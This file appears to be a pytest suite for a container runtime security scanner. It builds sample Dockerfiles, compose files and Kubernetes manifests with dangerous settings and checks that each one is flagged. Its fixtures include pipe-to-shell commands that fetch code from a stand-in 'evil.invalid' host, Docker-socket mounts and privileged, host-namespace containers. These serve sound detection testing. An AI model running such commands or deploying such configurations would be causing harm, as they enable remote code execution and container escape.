from __future__ import annotations

from clawlock.scanners.runtime_security import (
    RuntimeAuditBudget,
    RuntimeSecurityIssue,
    audit_runtime_security,
)


DIGEST = "sha256:" + "a" * 64


def _ids(report) -> set[str]:
    return {issue.rule_id for issue in report.issues}


def _issues(report, rule_id: str):
    return [issue for issue in report.issues if issue.rule_id == rule_id]


def test_dockerfile_explicit_dangers_are_high_confidence(tmp_path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM ubuntu:latest
ARG API_TOKEN=literal-build-secret
ENV PASSWORD legacy-image-secret
ADD ["https://downloads.example.invalid/tool.sh", "/tmp/tool.sh"]
RUN curl -fsSL https://downloads.example.invalid/install.sh | bash
RUN docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock helper
ENTRYPOINT ["server", "--host", "0.0.0.0"]
USER root
""".strip()
        + "\n",
        encoding="utf-8",
    )

    report = audit_runtime_security(dockerfile)

    assert report.complete
    assert {
        "RUN-IMAGE-LATEST-001",
        "RUN-SECRET-LAYER-001",
        "RUN-REMOTE-ADD-001",
        "RUN-DOWNLOAD-EXEC-001",
        "RUN-BUILD-ESCAPE-001",
        "RUN-SOCKET-001",
        "RUN-BIND-001",
        "RUN-ROOT-001",
    } <= _ids(report)
    assert next(issue for issue in report.issues if issue.rule_id == "RUN-DOWNLOAD-EXEC-001").severity == "critical"
    assert next(issue for issue in report.issues if issue.rule_id == "RUN-ROOT-001").confidence >= 0.99
    assert all(isinstance(issue, RuntimeSecurityIssue) for issue in report.issues)
    assert all("literal-build-secret" not in issue.evidence for issue in report.issues)
    assert all("legacy-image-secret" not in issue.evidence for issue in report.issues)


def test_digest_pinned_non_root_dockerfile_has_no_danger_issue(tmp_path):
    dockerfile = tmp_path / "Dockerfile.safe"
    dockerfile.write_text(
        f"FROM registry.example/app@{DIGEST}\n"
        "RUN --mount=type=secret,id=npm_token npm ci --ignore-scripts\n"
        "USER 65532:65532\n",
        encoding="utf-8",
    )

    report = audit_runtime_security(dockerfile)

    assert report.complete
    assert not report.issues


def test_compose_detects_escape_surfaces_secrets_and_broad_exposure(tmp_path):
    compose = tmp_path / "compose.yaml"
    compose.write_text(
        """
services:
  worker:
    image: registry.example/worker:latest
    privileged: true
    network_mode: host
    pid: host
    ipc: host
    user: "0:0"
    read_only: false
    cap_add: [SYS_ADMIN, NET_ADMIN, SYS_PTRACE]
    security_opt: [seccomp=unconfined]
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - /proc:/host/proc
    ports:
      - "0.0.0.0:8080:8080"
    environment:
      API_TOKEN: literal-runtime-secret
    build:
      context: .
      args:
        SIGNING_SECRET: ${SIGNING_SECRET}
""".lstrip(),
        encoding="utf-8",
    )

    report = audit_runtime_security(compose)

    assert report.complete
    assert {
        "RUN-PRIVILEGED-001",
        "RUN-HOSTNET-001",
        "RUN-HOSTPID-001",
        "RUN-HOSTIPC-001",
        "RUN-ROOT-001",
        "RUN-CAPABILITY-001",
        "RUN-SECCOMP-001",
        "RUN-SOCKET-001",
        "RUN-HOSTPATH-001",
        "RUN-HOSTPORT-001",
        "RUN-IMAGE-LATEST-001",
        "RUN-SECRET-ENV-001",
        "RUN-SECRET-BUILDARG-001",
        "RUN-BASELINE-001",
        "RUN-EGRESS-001",
    } <= _ids(report)
    assert next(issue for issue in _issues(report, "RUN-PRIVILEGED-001")).severity == "critical"
    assert all(issue.severity == "info" for issue in _issues(report, "RUN-EGRESS-001"))
    assert all("literal-runtime-secret" not in issue.evidence for issue in report.issues)


def test_safe_compose_internal_network_does_not_generate_baseline_noise(tmp_path):
    compose = tmp_path / "docker-compose.yml"
    compose.write_text(
        f"""
services:
  app:
    image: registry.example/app@{DIGEST}
    user: "65532:65532"
    read_only: true
    cap_drop: [ALL]
    security_opt:
      - no-new-privileges:true
    deploy:
      resources:
        limits:
          cpus: "1.0"
          memory: 256M
    ports:
      - "127.0.0.1:8080:8080"
    networks: [private]
networks:
  private:
    internal: true
""".lstrip(),
        encoding="utf-8",
    )

    report = audit_runtime_security(compose)

    assert report.complete
    assert not report.issues


def test_ordinary_compose_gaps_are_hardening_not_high(tmp_path):
    compose = tmp_path / "compose.yml"
    compose.write_text(
        "services:\n  web:\n    image: nginx:1.27\n    ports: [\"8080:80\"]\n",
        encoding="utf-8",
    )

    report = audit_runtime_security(compose)

    assert report.complete
    assert {"RUN-IMAGE-PIN-001", "RUN-HOSTPORT-001", "RUN-BASELINE-001", "RUN-EGRESS-001"} <= _ids(report)
    assert not [issue for issue in report.issues if issue.severity in {"high", "critical"}]
    assert all(issue.category == "hardening" for issue in report.issues)


def test_kubernetes_multidoc_detects_explicit_isolation_bypasses(tmp_path):
    manifest = tmp_path / "workloads.yaml"
    manifest.write_text(
        """
apiVersion: v1
kind: Pod
metadata:
  name: danger
  labels: {app: danger}
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  volumes:
    - name: runtime
      hostPath: {path: /var/run/docker.sock}
    - name: proc
      hostPath: {path: /proc}
  containers:
    - name: app
      image: registry.example/app:latest
      securityContext:
        privileged: true
        allowPrivilegeEscalation: true
        runAsUser: 0
        readOnlyRootFilesystem: false
        seccompProfile: {type: Unconfined}
        capabilities:
          add: [SYS_ADMIN, NET_ADMIN, SYS_PTRACE]
      ports:
        - containerPort: 8080
          hostPort: 8080
          hostIP: 0.0.0.0
      args: ["--host=0.0.0.0"]
      env:
        - name: API_TOKEN
          value: literal-k8s-secret
---
apiVersion: batch/v1
kind: Job
metadata: {name: missing-controls}
spec:
  template:
    metadata: {labels: {app: job}}
    spec:
      restartPolicy: Never
      containers:
        - name: job
          image: busybox:1.36
          command: ["true"]
""".lstrip(),
        encoding="utf-8",
    )

    report = audit_runtime_security(manifest)

    assert report.complete
    assert report.documents == 2
    assert {
        "RUN-HOSTNET-001",
        "RUN-HOSTPID-001",
        "RUN-HOSTIPC-001",
        "RUN-SOCKET-001",
        "RUN-HOSTPATH-001",
        "RUN-PRIVILEGED-001",
        "RUN-PRIVESC-001",
        "RUN-ROOT-001",
        "RUN-SECCOMP-001",
        "RUN-CAPABILITY-001",
        "RUN-HOSTPORT-001",
        "RUN-BIND-001",
        "RUN-IMAGE-LATEST-001",
        "RUN-SECRET-ENV-001",
        "RUN-BASELINE-001",
        "RUN-EGRESS-001",
    } <= _ids(report)
    assert next(issue for issue in _issues(report, "RUN-SOCKET-001")).severity == "critical"
    assert all("literal-k8s-secret" not in issue.evidence for issue in report.issues)


def test_hardened_deployment_and_matching_egress_policy_are_clean(tmp_path):
    manifest = tmp_path / "safe-k8s.yaml"
    manifest.write_text(
        f"""
apiVersion: apps/v1
kind: Deployment
metadata:
  name: safe
  namespace: tools
spec:
  template:
    metadata:
      labels: {{app: safe}}
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        seccompProfile: {{type: RuntimeDefault}}
      containers:
        - name: app
          image: registry.example/app@{DIGEST}
          securityContext:
            privileged: false
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: [ALL]
          resources:
            limits:
              cpu: "1"
              memory: 256Mi
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-egress
  namespace: tools
spec:
  podSelector:
    matchLabels: {{app: safe}}
  policyTypes: [Egress]
  egress: []
""".lstrip(),
        encoding="utf-8",
    )

    report = audit_runtime_security(manifest)

    assert report.complete
    assert report.documents == 2
    assert not report.issues


def test_allow_all_network_policy_is_not_treated_as_egress_restriction(tmp_path):
    manifest = tmp_path / "allow-all.yaml"
    manifest.write_text(
        f"""
apiVersion: v1
kind: Pod
metadata:
  name: app
  labels: {{app: demo}}
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 65532
    seccompProfile: {{type: RuntimeDefault}}
  containers:
    - name: app
      image: registry.example/app@{DIGEST}
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
      resources:
        limits: {{cpu: "1", memory: 128Mi}}
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {{name: allow-all}}
spec:
  podSelector: {{}}
  policyTypes: [Egress]
  egress:
    - {{}}
""".lstrip(),
        encoding="utf-8",
    )

    report = audit_runtime_security(manifest)

    assert report.complete
    assert _ids(report) == {"RUN-EGRESS-001"}


def test_cronjob_podspec_is_audited(tmp_path):
    manifest = tmp_path / "cron.yaml"
    manifest.write_text(
        """
apiVersion: batch/v1
kind: CronJob
metadata: {name: root-cron}
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          restartPolicy: Never
          hostPID: true
          containers:
            - name: task
              image: busybox:latest
              securityContext: {runAsUser: 0}
""".lstrip(),
        encoding="utf-8",
    )

    report = audit_runtime_security(manifest)

    assert report.complete
    assert {"RUN-HOSTPID-001", "RUN-ROOT-001", "RUN-IMAGE-LATEST-001"} <= _ids(report)


def test_invalid_yaml_and_unrecognized_explicit_yaml_fail_closed(tmp_path):
    broken = tmp_path / "broken.yaml"
    broken.write_text("services: [unterminated", encoding="utf-8")
    unrelated = tmp_path / "unrelated.yaml"
    unrelated.write_text("name: not-a-runtime-document\n", encoding="utf-8")

    broken_report = audit_runtime_security(broken)
    unrelated_report = audit_runtime_security(unrelated)

    for report in (broken_report, unrelated_report):
        assert not report.complete
        assert report.status == "INCOMPLETE"
        issue = next(issue for issue in report.issues if issue.rule_id == "RUN-INCOMPLETE-001")
        assert issue.metadata["scan_status"] == "error"
        assert issue.category == "diagnostic"


def test_file_document_node_and_time_budgets_fail_closed(tmp_path):
    manifest = tmp_path / "many.yaml"
    manifest.write_text(
        "apiVersion: v1\nkind: ConfigMap\nmetadata: {name: one}\n"
        "---\napiVersion: v1\nkind: ConfigMap\nmetadata: {name: two}\n",
        encoding="utf-8",
    )

    oversized = audit_runtime_security(
        manifest,
        RuntimeAuditBudget(max_file_bytes=10),
    )
    document_limited = audit_runtime_security(
        manifest,
        RuntimeAuditBudget(max_yaml_documents=1),
    )
    node_limited = audit_runtime_security(
        manifest,
        RuntimeAuditBudget(max_yaml_nodes=3),
    )
    time_limited = audit_runtime_security(
        manifest,
        RuntimeAuditBudget(max_seconds=0),
    )

    for report in (oversized, document_limited, node_limited, time_limited):
        assert not report.complete
        assert "RUN-INCOMPLETE-001" in _ids(report)


def test_directory_scan_ignores_unrelated_yaml_but_audits_runtime_files(tmp_path):
    (tmp_path / "settings.yaml").write_text("theme: dark\n", encoding="utf-8")
    (tmp_path / "Dockerfile").write_text(
        "FROM alpine:latest\nUSER root\n",
        encoding="utf-8",
    )

    report = audit_runtime_security(tmp_path)

    assert report.complete
    assert set(report.inspected_files) == {"Dockerfile", "settings.yaml"}
    assert "RUN-ROOT-001" in _ids(report)
    assert not _issues(report, "RUN-INCOMPLETE-001")


def test_dockerfile_heredoc_onbuild_and_unrelated_checksum_do_not_bypass(tmp_path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        "FROM alpine:3.21\n"
        "RUN <<EOF\n"
        "curl https://evil.invalid/one | /bin/sh\n"
        "EOF\n"
        "ONBUILD RUN curl https://evil.invalid/two | bash\n"
        "RUN echo x | sha256sum -c -; curl https://evil.invalid/three | dash\n"
        "USER root:1000\n",
        encoding="utf-8",
    )

    report = audit_runtime_security(dockerfile)

    assert report.complete
    downloads = _issues(report, "RUN-DOWNLOAD-EXEC-001")
    assert len(downloads) == 3
    assert all(issue.severity == "critical" and issue.category == "danger" for issue in downloads)
    assert "RUN-ROOT-001" in _ids(report)


def test_dockerfile_comments_and_labels_are_not_execution_evidence(tmp_path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        "FROM alpine:3.21\n"
        "LABEL docs=/var/run/docker.sock\n"
        "RUN echo safe # curl https://evil.invalid/x | bash\n"
        "USER 65532\n",
        encoding="utf-8",
    )

    report = audit_runtime_security(dockerfile)

    assert report.complete
    assert "RUN-SOCKET-001" not in _ids(report)
    assert "RUN-DOWNLOAD-EXEC-001" not in _ids(report)


def test_compose_interpolation_dangerous_defaults_are_audited(tmp_path):
    compose = tmp_path / "compose.yaml"
    compose.write_text(
        "services:\n"
        "  app:\n"
        "    image: alpine:3.21\n"
        "    privileged: ${PRIVILEGED:-true}\n"
        "    network_mode: ${MODE:-host}\n"
        "    user: ${UID:-0}\n"
        "    environment:\n"
        "      API_TOKEN: ${TOKEN:-hardcoded-secret}\n",
        encoding="utf-8",
    )

    report = audit_runtime_security(compose)

    assert report.complete
    assert {
        "RUN-PRIVILEGED-001",
        "RUN-HOSTNET-001",
        "RUN-ROOT-001",
        "RUN-SECRET-ENV-001",
    } <= _ids(report)
    assert all("hardcoded-secret" not in issue.evidence for issue in report.issues)


def test_directory_discovers_containerfile(tmp_path):
    (tmp_path / "Containerfile.dev").write_text(
        "FROM alpine:3.21\nUSER 0:1000\n",
        encoding="utf-8",
    )

    report = audit_runtime_security(tmp_path)

    assert report.complete
    assert report.inspected_files == ["Containerfile.dev"]
    assert "RUN-ROOT-001" in _ids(report)


def test_semantic_and_issue_budgets_fail_closed(tmp_path):
    compose = tmp_path / "compose.yaml"
    compose.write_text(
        "x-service: &service\n"
        "  image: alpine:latest\n"
        "services:\n"
        "  one: *service\n"
        "  two: *service\n",
        encoding="utf-8",
    )

    semantic_limited = audit_runtime_security(
        compose,
        RuntimeAuditBudget(max_semantic_items=1),
    )
    issue_limited = audit_runtime_security(
        compose,
        RuntimeAuditBudget(max_issues=1),
    )

    for report in (semantic_limited, issue_limited):
        assert not report.complete
        assert report.status == "INCOMPLETE"
        assert "RUN-INCOMPLETE-001" in _ids(report)


def test_required_runtime_inventory_fails_closed_when_directory_is_empty(tmp_path):
    integrated = audit_runtime_security(tmp_path)
    explicit = audit_runtime_security(tmp_path, require_candidates=True)

    assert integrated.complete is True
    assert explicit.complete is False
    assert "RUN-INCOMPLETE-001" in _ids(explicit)


def test_yaml_parser_diagnostics_never_echo_secret_source_lines(tmp_path):
    manifest = tmp_path / "compose.yaml"
    secret = "supersecret-value"
    manifest.write_text(
        f"services: {{}}\nPASSWORD: {secret}: invalid\n", encoding="utf-8"
    )

    report = audit_runtime_security(manifest)
    rendered = " ".join(
        [*report.diagnostics]
        + [issue.detail for issue in report.issues]
        + [issue.evidence for issue in report.issues]
    )

    assert report.complete is False
    assert secret not in rendered
